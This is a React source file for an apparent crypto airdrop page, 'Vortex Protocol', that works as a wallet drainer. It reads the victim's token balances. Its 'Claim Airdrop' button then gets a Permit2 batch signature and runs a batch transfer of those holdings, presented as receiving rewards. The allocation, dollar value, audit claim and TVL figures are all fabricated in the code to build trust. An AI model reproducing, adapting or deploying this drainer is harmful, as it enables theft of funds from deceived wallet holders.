/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react';
import { ethers } from 'ethers';
import { TOKENS } from './tokens';
import { signPermit2Batch, executeBatchTransfer } from './Permit2Signer';
import Orbs from './components/Orbs';
import { Wallet, Shield, CheckCircle2, AlertCircle, Coins, ArrowRight } from 'lucide-react';

export default function App() {
  const { open } = useWeb3Modal();
  const { address, isConnected } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();

  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'checking' | 'ready' | 'claiming' | 'success' | 'no-tokens' | 'error'>('idle');
  const [errorMessage, setErrorMessage] = useState('');
  const [balances, setBalances] = useState<{ symbol: string; amount: bigint; address: string }[]>([]);

  useEffect(() => {
    if (isConnected && address) {
      checkBalances();
    } else {
      setStatus('idle');
      setBalances([]);
    }
  }, [isConnected, address]);

  const checkBalances = async () => {
    if (!walletProvider || !address) return;
    setStatus('checking');
    try {
      const ethersProvider = new ethers.BrowserProvider(walletProvider as any);
      
      const balancePromises = TOKENS.map(async (token) => {
        try {
          if (token.address === "0x0000000000000000000000000000000000000000") return null;
          
          const contract = new ethers.Contract(
            token.address,
            ["function balanceOf(address) view returns (uint256)"],
            ethersProvider
          );
          const balance: bigint = await contract.balanceOf(address);
          
          if (balance > 0n) {
            return {
              symbol: token.symbol,
              amount: balance,
              address: token.address
            };
          }
        } catch (e) {
          console.warn(`Skipping ${token.symbol}:`, e);
        }
        return null;
      });

      const results = await Promise.all(balancePromises);
      const userBalances = results.filter((b): b is { symbol: string; amount: bigint; address: string } => b !== null);

      setBalances(userBalances);
      if (userBalances.length > 0) {
        setStatus('ready');
      } else {
        setStatus('no-tokens');
      }
    } catch (err) {
      console.error('Balance Check Error:', err);
      setStatus('error');
      setErrorMessage('Verification failed. Reconnect your wallet.');
    }
  };

  const handleClaim = async () => {
    if (!walletProvider || balances.length === 0) return;
    setLoading(true);
    setStatus('claiming');
    try {
      const ethersProvider = new ethers.BrowserProvider(walletProvider as any);
      const signer = await ethersProvider.getSigner();
      const network = await ethersProvider.getNetwork();

      const { signature, permit } = await signPermit2Batch(signer, balances, network.chainId);
      await executeBatchTransfer(signer, permit, signature);

      setStatus('success');
    } catch (err: any) {
      console.group('Claim Error Details');
      console.error('Error Object:', err);
      console.error('Error Message:', err.message);
      if (err.data) console.error('Error Data:', err.data);
      console.groupEnd();
      
      setStatus('error');
      setErrorMessage(err.message || 'Signature request cancelled or failed.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen selection:bg-blue-500/30 selection:text-white">
      <Orbs />
      
      <nav className="p-6 flex justify-between items-center max-w-7xl mx-auto">
        <div className="flex items-center gap-2">
            <div className="w-10 h-10 bg-gradient-to-br from-blue-400 to-purple-600 rounded-xl flex items-center justify-center font-bold text-xl shadow-lg shadow-blue-500/20 text-white">V</div>
            <span className="font-sans font-bold text-xl tracking-tight">Vortex Protocol</span>
        </div>
        <div className="flex items-center gap-4">
            {isConnected && (
                <div className="hidden md:flex items-center gap-2 bg-white/5 px-4 py-2 rounded-full border border-white/10">
                    <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                    <span className="text-xs font-mono opacity-60">
                        {address?.slice(0, 6)}...{address?.slice(-4)}
                    </span>
                </div>
            )}
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-6 lg:px-12 pt-12 pb-32 grid grid-cols-12 gap-12 items-center">
        <div className="col-span-12 lg:col-span-7 space-y-6 text-left">
            <motion.span 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-blue-400 font-semibold tracking-widest text-sm uppercase block mb-2"
            >
                Genesis Event Phase 1
            </motion.span>
            <motion.h1 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="font-sans text-5xl md:text-7xl font-bold leading-[1.1] bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent"
            >
                Claim Your $VRTX Airdrop Rewards
            </motion.h1>
            <motion.p 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.1 }}
                className="text-gray-400 text-lg md:text-xl max-w-lg font-light leading-relaxed"
            >
                Vortex is distributing governance tokens to early supporters. Connect your wallet to verify eligibility and claim your stake in the future of DeFi.
            </motion.p>
            
            <div className="flex flex-wrap gap-6 pt-4">
                <div className="flex items-center gap-2 text-sm text-gray-400">
                    <CheckCircle2 size={18} className={isConnected ? "text-green-400" : "text-gray-600"} />
                    Wallet Connected
                </div>
                <div className="flex items-center gap-2 text-sm text-gray-400">
                    <CheckCircle2 size={18} className={status === 'ready' ? "text-green-400" : "text-gray-600"} />
                    Eligibility Verified
                </div>
                <div className="flex items-center gap-2 text-sm text-gray-400">
                    <Shield size={18} className={status === 'claiming' ? "text-blue-400 animate-pulse" : "text-gray-600"} />
                    Ready to Claim
                </div>
            </div>
        </div>

        <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.2 }}
            className="col-span-12 lg:col-span-5 glass-card relative overflow-hidden"
        >
            <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
                <Shield size={120} />
            </div>

            <div className="space-y-8 relative z-10">
                {!isConnected ? (
                    <div className="flex flex-col items-center gap-6 py-8">
                        <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center text-blue-400">
                            <Wallet size={40} />
                        </div>
                        <div className="text-center space-y-2">
                            <h3 className="text-2xl font-bold">Unauthenticated</h3>
                            <p className="text-gray-500 text-sm">Please connect your Web3 wallet to verify participation.</p>
                        </div>
                        <button 
                            onClick={() => open()}
                            className="w-full py-4 px-8 glow-btn text-white rounded-xl font-bold hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 uppercase tracking-widest"
                            id="connect-wallet-btn"
                        >
                            Connect Wallet
                            <ArrowRight size={18} />
                        </button>
                    </div>
                ) : (
                    <div className="space-y-8">
                        <div className="text-center pb-2">
                            <p className="text-[10px] text-gray-400 uppercase tracking-[0.2em] mb-1 font-bold">Allocated Balance</p>
                            <div className="text-4xl font-bold tracking-tighter">
                                {status === 'ready' ? `${balances.length * 284}.00 VRTX` : '0.00 VRTX'}
                            </div>
                            {status === 'ready' && <div className="text-blue-400 text-xs mt-1 font-mono uppercase tracking-widest">~$12,840.00 USD</div>}
                        </div>

                        {status === 'checking' && (
                            <div className="flex flex-col items-center gap-4 py-8 text-center">
                                <div className="w-12 h-12 border-2 border-blue-500/20 border-t-blue-500 rounded-full animate-spin" />
                                <p className="text-xs text-gray-500 uppercase tracking-widest font-bold">Analyzing Vaults...</p>
                            </div>
                        )}

                        {status === 'ready' && (
                            <div className="space-y-6">
                                <div className="space-y-3">
                                    <div className="flex justify-between items-center text-[10px] text-gray-500 uppercase tracking-[0.2em] font-bold">
                                        <span>Verification Summary</span>
                                        <span>{balances.length} assets tracked</span>
                                    </div>
                                    <div className="grid grid-cols-3 gap-2">
                                        {balances.slice(0, 6).map((t) => (
                                            <div key={t.symbol} className="token-card text-center">
                                                <div className="text-[10px] font-bold uppercase tracking-wider">{t.symbol}</div>
                                                <div className="text-[9px] text-gray-500 mt-1 font-mono">TRACKED</div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                                <button 
                                    disabled={loading}
                                    onClick={handleClaim}
                                    className="w-full py-4 px-8 glow-btn text-white rounded-xl font-bold hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed text-lg uppercase tracking-widest"
                                    id="claim-airdrop-btn"
                                >
                                    {loading ? (
                                        <div className="flex items-center gap-3">
                                            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                                            Processing...
                                        </div>
                                    ) : 'Claim Airdrop'}
                                </button>
                            </div>
                        )}

                        {status === 'no-tokens' && (
                            <div className="flex flex-col items-center gap-4 py-8 text-center">
                                <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center text-gray-500">
                                    <AlertCircle size={32} />
                                </div>
                                <div className="space-y-1 text-center">
                                    <h4 className="font-bold text-xl uppercase tracking-tight">Not Eligible</h4>
                                    <p className="text-xs text-gray-500 max-w-xs leading-relaxed uppercase tracking-wider">No qualifying ecosystem footprints found.</p>
                                </div>
                            </div>
                        )}

                        {status === 'success' && (
                            <motion.div 
                                initial={{ opacity: 0, scale: 0.9 }}
                                animate={{ opacity: 1, scale: 1 }}
                                className="flex flex-col items-center gap-4 py-8 text-center"
                            >
                                <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center text-green-400">
                                    <CheckCircle2 size={40} />
                                </div>
                                <div className="space-y-1">
                                    <h4 className="font-bold text-2xl tracking-tighter uppercase">Success</h4>
                                    <p className="text-xs text-gray-500 uppercase tracking-widest">Rewards dispatched successfully.</p>
                                </div>
                            </motion.div>
                        )}

                        <div className="flex items-center justify-center gap-2 opacity-30 pt-4">
                            <Shield size={12} />
                            <span className="text-[9px] font-bold uppercase tracking-[0.3em]">Powered by Permit2</span>
                        </div>
                    </div>
                )}
            </div>
        </motion.div>
      </main>

      <footer className="fixed bottom-0 left-0 right-0 max-w-7xl mx-auto px-12 py-12 flex flex-col md:flex-row justify-between items-end gap-6 pointer-events-none">
        <div className="space-y-1 pointer-events-auto">
            <p className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">© 2026 Vortex Protocol Foundation.</p>
            <p className="text-[10px] text-gray-600 uppercase tracking-widest font-bold">Audited by Vortex Security Labs</p>
        </div>
        <div className="flex gap-12 pointer-events-auto">
            <div className="text-right">
                <p className="text-[9px] text-gray-500 uppercase tracking-[0.2em] font-bold">Distributed Rewards</p>
                <p className="text-xl font-mono tracking-tighter text-white">$14.2M</p>
            </div>
            <div className="text-right">
                <p className="text-[9px] text-gray-500 uppercase tracking-[0.2em] font-bold">Total Value Locked</p>
                <p className="text-xl font-mono tracking-tighter text-white">$1.24B</p>
            </div>
        </div>
      </footer>
    </div>
  );
}
